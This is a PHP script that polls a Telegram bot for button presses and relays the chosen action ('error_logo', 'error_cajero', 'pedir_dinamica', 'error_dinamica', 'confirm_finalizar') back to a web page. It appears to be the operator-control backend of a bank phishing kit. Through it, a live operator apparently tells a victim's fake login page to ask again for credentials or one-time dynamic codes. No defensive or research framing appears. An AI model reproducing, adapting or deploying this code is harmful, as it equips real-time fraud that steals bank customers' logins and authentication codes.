<?php
session_start();
header('Content-Type: application/json');

$configPath = __DIR__ . '/../config.php';
if (!file_exists($configPath)) {
    echo json_encode(['action' => null, 'error' => 'Falta config.php']);
    exit;
}
$config = require $configPath;

$transactionId = $_POST['transactionId'] ?? '';
$messageId     = $_POST['messageId'] ?? '';

if (!$transactionId || !$messageId) {
    echo json_encode(['action' => null, 'error' => 'Faltan datos']);
    exit;
}

if (
    isset($_SESSION['current_transaction'], $_SESSION['current_action']) &&
    $_SESSION['current_transaction'] === $transactionId
) {
    $action = $_SESSION['current_action'];
    unset($_SESSION['current_transaction'], $_SESSION['current_action']);
    echo json_encode(['action' => $action]);
    exit;
}

$ch = curl_init("https://api.telegram.org/bot{$config['bot_token']}/getUpdates");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
curl_close($ch);

$data = json_decode($response, true);
$action = null;
$lastUpdateId = null;

if (!empty($data['result'])) {
    foreach ($data['result'] as $update) {
        $lastUpdateId = $update['update_id'];

        if (
            isset($update['callback_query']['data']) &&
            strpos($update['callback_query']['data'], $transactionId) !== false
        ) {
            $callbackData = $update['callback_query']['data'];
            $callbackTime = $update['callback_query']['message']['date'] ?? time();
            $now = time();

            if (($now - $callbackTime) <= 30) {
                list($actionType) = explode(':', $callbackData);
                $allowedActions = ['error_logo', 'error_cajero', 'pedir_dinamica', 'error_dinamica', 'confirm_finalizar'];

                if (in_array($actionType, $allowedActions)) {
                    $action = $actionType;

                    $ch = curl_init("https://api.telegram.org/bot{$config['bot_token']}/editMessageReplyMarkup");
                    curl_setopt_array($ch, [
                        CURLOPT_RETURNTRANSFER => true,
                        CURLOPT_POST => true,
                        CURLOPT_POSTFIELDS => json_encode([
                            'chat_id' => $config['chat_id'],
                            'message_id' => $messageId,
                            'reply_markup' => json_encode(['inline_keyboard' => []])
                        ]),
                        CURLOPT_HTTPHEADER => ['Content-Type: application/json']
                    ]);
                    curl_exec($ch);
                    curl_close($ch);
                    break;
                }
            }
        }
    }

    if ($lastUpdateId !== null) {
        $next = $lastUpdateId + 1;
        curl_exec(curl_init("https://api.telegram.org/bot{$config['bot_token']}/getUpdates?offset={$next}"));
    }
}

echo json_encode(['action' => $action]);
